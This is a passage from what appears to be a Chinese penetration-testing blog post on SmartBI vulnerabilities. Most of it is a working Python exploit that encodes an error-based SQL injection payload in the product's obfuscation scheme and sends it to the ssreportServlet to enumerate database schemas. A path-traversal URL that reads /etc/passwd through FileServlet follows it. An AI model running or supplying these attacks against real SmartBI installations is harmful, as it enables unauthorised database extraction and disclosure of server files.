class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment">#去除https的warning</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">ENCODING_SCHEDULE = &#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;1&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;3&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;4&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;5&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;6&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;7&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;8&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;9&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;!&quot;</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;%&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;(&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;)&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;*&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;+&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;A&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;B&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;C&quot;</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">    <span class="string">&quot;D&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;E&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;F&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;G&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;H&quot;</span>: <span class="string">&quot;r&quot;</span>, <span class="string">&quot;I&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;J&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;K&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;M&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;N&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;O&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;P&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;Q&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;R&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;S&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;T&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;U&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;V&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;W&quot;</span>: <span class="string">&quot;!&quot;</span>, <span class="string">&quot;X&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;Y&quot;</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Z&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;a&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;b&quot;</span>: <span class="string">&quot;~&quot;</span>, <span class="string">&quot;c&quot;</span>: <span class="string">&quot;i&quot;</span>, <span class="string">&quot;d&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;e&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;f&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;g&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;h&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;i&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;j&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;k&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;l&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;m&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;n&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;o&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;p&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;q&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;r&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;s&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;t&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;u&quot;</span>: <span class="string">&quot;Q&quot;</span>,</span><br><span class="line">    <span class="string">&quot;v&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;w&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;x&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;y&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;z&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;~&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;_&quot;</span>: <span class="string">&quot;y&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECODING_SCHEDULE = &#123;</span><br><span class="line">    <span class="string">&quot;7&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;u&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;N&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;K&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;J&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;M&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;9&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;m&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;P&quot;</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;n&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;A&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;E&quot;</span>: <span class="string">&quot;)&quot;</span>, <span class="string">&quot;s&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;f&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;q&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;O&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;V&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;t&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">    <span class="string">&quot;T&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;a&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;x&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;H&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;r&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;c&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;v&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;l&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;8&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;F&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;3&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    <span class="string">&quot;o&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;L&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Y&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;j&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;W&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;*&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;z&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;Z&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;!&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;B&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;)&quot;</span>: <span class="string">&quot;Y&quot;</span>,</span><br><span class="line">    <span class="string">&quot;U&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;(&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;~&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;i&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;h&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;p&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;_&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;I&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;R&quot;</span>: <span class="string">&quot;i&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;j&quot;</span>,</span><br><span class="line">    <span class="string">&quot;G&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;S&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;d&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;6&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;w&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;5&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;0&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;4&quot;</span>: <span class="string">&quot;r&quot;</span>, <span class="string">&quot;D&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;k&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;Q&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;b&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;C&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;2&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;X&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;e&quot;</span>: <span class="string">&quot;~&quot;</span>, <span class="string">&quot;y&quot;</span>: <span class="string">&quot;_&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#此函数可以用来加密明文也可以解密服务器返回的密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">code</span>):</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> code:</span><br><span class="line">        out = out + ENCODING_SCHEDULE.get(item, item)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">code</span>):</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> code:</span><br><span class="line">        out = out + DECODING_SCHEDULE.get(item, item)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://127.0.0.1/vision/ssreportServlet&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;JSESSIONID=4BB550BF10C606619B753D3CE52CD3AB&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">origin1 = <span class="string">&#x27;&#x27;&#x27;[&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.单位名称&quot;,&quot;name&quot;:&quot;单位名称&quot;,&quot;alias&quot;:&quot;单位名称&quot;,&quot;value&quot;:&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">origin2 = <span class="string">&#x27;&#x27;&#x27;&quot;,&quot;displayValue&quot;:&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">origin3 = <span class="string">&#x27;&#x27;&#x27;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所属机构&quot;,&quot;name&quot;:&quot;所属机构&quot;,&quot;alias&quot;:&quot;所属机构&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在省份&quot;,&quot;name&quot;:&quot;所在省份&quot;,&quot;alias&quot;:&quot;所在省份&quot;,&quot;value&quot;:&quot;440000&quot;,&quot;displayValue&quot;:&quot;广东&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在地市&quot;,&quot;name&quot;:&quot;所在地市&quot;,&quot;alias&quot;:&quot;所在地市&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在区县&quot;,&quot;name&quot;:&quot;所在区县&quot;,&quot;alias&quot;:&quot;所在区县&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id&quot;,&quot;name&quot;:&quot;id&quot;,&quot;alias&quot;:&quot;检测机构id&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间起&quot;,&quot;name&quot;:&quot;填报时间起&quot;,&quot;alias&quot;:&quot;填报时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间止&quot;,&quot;name&quot;:&quot;填报时间止&quot;,&quot;alias&quot;:&quot; 填报时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间起&quot;,&quot;name&quot;:&quot;更新时间起&quot;,&quot;alias&quot;:&quot;更新时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间止&quot;,&quot;name&quot;:&quot;更新时间止&quot;,&quot;alias&quot;:&quot;更新时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;]&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    payload = <span class="string">&quot;%&#x27; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit &#123;0&#125;,1),0x7e)) and null = &#x27;%&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    origin_full = origin1 + payload + origin2 + payload + origin3</span><br><span class="line">    <span class="comment"># print(origin_full)</span></span><br><span class="line">    url_encode_full = quote(origin_full)</span><br><span class="line">    <span class="comment"># print(url_encode_full)</span></span><br><span class="line">    rmi_encode = encode(url_encode_full)</span><br><span class="line">    <span class="comment"># print(rmi_encode)</span></span><br><span class="line">    encode_final = <span class="string">&#x27;encode=&#x27;</span>+rmi_encode</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;resid&quot;</span>:<span class="string">&quot;I40281d81016a8bc28bc20231016aaee007b230ac&quot;</span>,</span><br><span class="line">        <span class="string">&quot;clientId&quot;</span>:<span class="string">&quot;Iff8080810176f0c7f0c7544f0176f54eb72c1160&quot;</span>,</span><br><span class="line">        <span class="string">&quot;refreshType&quot;</span>:<span class="string">&quot;refresh&quot;</span>,</span><br><span class="line">        <span class="string">&quot;paramsInfoEncode&quot;</span>:encode_final</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#proxies = &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;,&#x27;https&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(url,data=data,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    regex = <span class="string">r&quot;~\w+~&quot;</span></span><br><span class="line">    match = re.search(regex,r.text).span() <span class="comment">#返回第一个匹配到的结果的位置（1000,1005）</span></span><br><span class="line">    database = r.text[match[<span class="number">0</span>]+<span class="number">1</span>:match[<span class="number">1</span>]-<span class="number">1</span>]</span><br><span class="line">    print(r.text[match[<span class="number">0</span>]:match[<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(database+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112175110646.png" alt="image-20210112175110646"></p>
<p>在想怎么结合sqlmap写tamper指定位置实现注入，需要修改tamper</p>
<p>大佬们求带~~</p>
<h1 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h1><p>V85以下的可能任意文件下载都有。V95版本不存在。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;FileServlet?ftpType&#x3D;out&amp;path&#x3D;upload&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&amp;name&#x3D;%E4%B8%AD%E5%9B%BD%E7%9F%B3%E6%B2%B9%E5%90%89%E6%9E%97%E7%99%BD%E5%9F%8E%E9%94%80%E5%94%AE%E5%88%86%E5%85%AC%E5%8F%B8XX%E5%8A%A0%E6%B2%B9%E7%AB%99%E9%98%B2%E9%9B%B7%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88.docx</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112145403202.png" alt="image-20210112145403202"></p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112182330751.png" alt="image-20210112182330751"></p>
<blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://www.onebug.org/huwangVuln/98921.html">https://www.onebug.org/huwangVuln/98921.html</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ">https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ</a></p>
</blockquote>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/categories/web%E6%B8%97%E9%80%8F/page/0/">上一页</a></div><div class="pagination-next"><a href="/categories/web%E6%B8%97%E9%80%8F/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/categories/web%E6%B8%97%E9%80%8F/">1</a></li><li><a class="pagination-link" href="/categories/web%E6%B8%97%E9%80%8F/page/2/">2</a></li><li><a class="pagination-link" href="/categories/web%E6%B8%97%E9%80%8F/page/3/">3</a></li><li><a class="pagination-link" href="/categories/web%E6%B8%97%E9%80%8F/page/4/">4</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="B0urne"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">B0urne</p><p class="is-size-6 is-block">渗透测试/WEB安全</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">79</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="http://www.ol4three.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">oldthree</span></span><span class="level-right"><span class="level-item tag">www.ol4three.com</span></span></a></li><li><a class="level is-mobile" href="http://blog.leanote.com/xcniao@foxmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">XCniao</span></span><span class="level-right"><span class="level-item tag">blog.leanote.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/Mac/"><span class="level-start"><span class="level-item">Mac</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQL注入</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/SpringBoot/"><span class="level-start"><span class="level-item">SpringBoot</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/XSS/"><span class="level-start"><span class="level-item">XSS</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/hexo/"><span class="level-start"><span class="level-item">hexo</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/web%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">web渗透</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile" href="/categories/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"><span class="level-start"><span class="level-item">人生感悟</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%9B%E9%98%B6/"><span class="level-start"><span class="level-item">博客搭建进阶</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%8F%90%E6%9D%83/"><span class="level-start"><span class="level-item">提权</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="level-start"><span class="level-item">文件上传</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"><span class="level-start"><span class="level-item">服务器原理</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">渗透测试</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/recurrent/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><span class="level-start"><span class="level-item">漏洞挖掘</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%95%E8%BF%87/"><span class="level-start"><span class="level-item">绕过</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"><span class="level-start"><span class="level-item">问题汇总</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%9D%A2%E8%AF%95/"><span class="level-start"><span class="level-item">面试</span></span><span class="level-end"><span class="level-item 